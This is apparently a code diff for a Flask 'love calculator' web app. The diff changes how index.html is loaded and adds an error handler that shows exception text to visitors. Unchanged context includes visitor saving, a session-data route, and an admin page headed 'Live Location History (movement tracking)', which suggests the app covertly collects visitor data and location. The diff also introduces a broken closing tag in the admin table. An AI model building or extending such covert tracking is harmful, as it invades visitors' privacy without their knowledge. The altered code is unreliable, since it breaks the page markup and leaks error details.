@@ -19,7 +19,7 @@ else:
 
 SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"
 
-# ---------- Helper Functions (unchanged) ----------
+# ---------- Helper Functions ----------
 def save_visitor(data):
     if supabase is None:
         return
@@ -100,10 +100,15 @@ def get_love_message(name1, name2, percentage):
 # ---------- Flask Routes ----------
 @app.route('/')
 def index():
-    # Read the HTML from the external file
-    with open('index.html', 'r', encoding='utf-8') as f:
-        html_content = f.read()
-    return render_template_string(html_content)
+    # Read the HTML file from the same directory as this script
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    html_path = os.path.join(base_dir, 'index.html')
+    try:
+        with open(html_path, 'r', encoding='utf-8') as f:
+            html_content = f.read()
+        return render_template_string(html_content)
+    except Exception as e:
+        return f"<h1>Error loading index.html</h1><p>{str(e)}</p>", 500
 
 @app.route('/get-session-data', methods=['POST'])
 def get_session_data_route():
@@ -185,7 +190,7 @@ def admin():
                         display_val = str(val)[:500]
                     html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
                 html += '</tr>'
-            html += '</table></div>'
+            html += '<table></div>'
 
             html += '<hr><h2>📍 Live Location History (movement tracking)</h2>'
             for v in visitors:
